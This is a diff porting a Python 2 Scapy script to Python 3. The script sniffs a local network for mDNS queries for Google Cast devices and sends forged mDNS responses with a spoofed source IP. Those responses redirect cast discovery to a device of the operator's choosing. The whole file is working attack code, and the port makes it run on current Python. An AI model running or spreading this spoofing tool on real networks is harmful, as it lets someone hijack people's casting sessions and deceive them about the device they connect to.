@@ -1,6 +1,6 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
-#python 2.7
+#python 3.8
 from scapy.all import *
 from struct import pack
 from time import sleep
@@ -19,7 +19,7 @@ def get_info(ip):
     root = ET.fromstring(r.text)
     uuid = root[2][4].text
     fn = root[2][1].text
-    fn = binascii.hexlify(fn)
+    fn = fn.encode('ascii').hex()
     uuid = uuid.split(':')[1]
     return [uuid, fn]
 
@@ -32,7 +32,7 @@ def spoof_response(pkt):
     uuid_fn = get_info(redirect_to)
     uuid = uuid_fn[0]
     fn = uuid_fn[1]
-    fn_len = len(fn)/2
+    fn_len = len(fn)//2
     a = redirect_to.split('.')
     hex_ip = '{:02X}{:02X}{:02X}{:02X}'.format(*map(int, a))
     uuid_nodash = ''.join(uuid.split('-'))
@@ -41,10 +41,10 @@ def spoof_response(pkt):
     # may need to dynamically set the length but I am assuming all uuids are the same length
     # TODO test put uid in dynamically
     ans = '00 00 84 00 00 00 00 01 00 00 00 03 0b 5f 67 6f 6f 67 6c 65 63 61 73 74 04 5f 74 63 70'
-    dot_local_loc = 'c' + hex(len(''.join(ans.split()))/2)[2:].zfill(3)
+    dot_local_loc = 'c' + hex(len(''.join(ans.split()))//2)[2:].zfill(3)
     ans += '05 6c 6f 63 61 6c 00 00 0c 00 01 00 00 00 78 00 2e'
     ans += '2b 43 68 72 6f 6d 65 63 61 73 74 2d'                            # Chromecast- prepend
-    ans += binascii.hexlify(uuid_nodash)                                   # uuid
+    ans += uuid_nodash.encode('ascii').hex()                                # uuid
     ans += 'c0 0c'                                                          # offset to .local
 
     data_length = 6 + 3 + len(uuid_nodash) + 3  + fn_len + 3 + 5 + 13 + 18  # num of lengths + weird field len + lengths + ve field len + len chromecast + len icon + 2 threes for xx=
@@ -55,7 +55,7 @@ def spoof_response(pkt):
     ansextratxt += hex(data_length)[2:].zfill(4)                            # data length
     ansextratxt += '23'                                                     # length of next txt section (ID)
     ansextratxt += '69 64 3d'                                               # ASCII id= as hex
-    ansextratxt += binascii.hexlify(uuid_nodash)                            # the id
+    ansextratxt += uuid_nodash.encode('ascii').hex()                        # the id
     ansextratxt += '03'                                                     # 3 len of this weird field rs=
     ansextratxt += '72 73 3d'                                               # weird field rs=
     ansextratxt += hex(fn_len + 3)[2:].zfill(2)                             # length of the next txt section (FN)
@@ -80,9 +80,9 @@ def spoof_response(pkt):
 
     # SRV record - points to the port that serves the CAST
     ansextrasrv =  'c0 2e 00 21 80 01 00 00 00 78 00 2d 00 00 00 00 1f 49'  # srv record stuff
-    dom_loc = 'c' + hex((len(''.join(ans.split())) + len(''.join(ansextratxt.split())) + len(''.join(ansextrasrv.split())))/2)[2:].zfill(3)
+    dom_loc = 'c' + hex((len(''.join(ans.split())) + len(''.join(ansextratxt.split())) + len(''.join(ansextrasrv.split())))//2)[2:].zfill(3)
     ansextrasrv += '24'                                                     # $ to be the start
-    ansextrasrv += binascii.hexlify(uuid)                                   # uid with dashes
+    ansextrasrv += uuid.encode('ascii').hex()                               # uid with dashes
     ansextrasrv += dot_local_loc                                            # <uuid with dashes><.local location> --- the last domain
 
     # A record - points to the ip address of the Chromecast
@@ -94,23 +94,23 @@ def spoof_response(pkt):
 
     # turn mDNS answer into hex for the Raw portion of the payload
     data_list = ans.split()
-    data_hex = ''.join(data_list).decode('hex')
+    data_hex = bytes.fromhex(''.join(data_list))
 
     #spoofed_pkt = IP(src='192.168.1.104', dst='224.0.0.251')/UDP(dport='mdns', sport='mdns')/Raw(load=data_hex)
     spoofed_pkt = IP(src=redirect_to, dst=pkt[IP].dst)/UDP(dport='mdns', sport='mdns')/Raw(load=data_hex)
     send(spoofed_pkt)
-    print 'Sent spoofed response:', spoofed_pkt.summary()
+    print('Sent spoofed response:', spoofed_pkt.summary())
 
 
 ## Define our Custom Action function
 def customAction(packet):
     global packetCount
     packetCount += 1
-    #print packet.show()
+    #print(packet.show())
     if DNSQR in packet:
-        if packet[DNSQR].qname == '_googlecast._tcp.local.':
+        if packet[DNSQR].qname == b'_googlecast._tcp.local.':
             if packet[IP].dst != redirect_to:
-                print 'chromecast is being looked for'
+                print('chromecast is being looked for')
                 spoof_response(packet)
                 return "Packet #%s: %s ==> %s" % (packetCount, packet[0][1].src, packet[0][1].dst)
 
@@ -126,3 +126,5 @@ if interface:
     sniff(filter="ip", prn=customAction, iface=interface)
 else:
     sniff(filter="ip", prn=customAction)
+
+# vim: set ts=4 et:
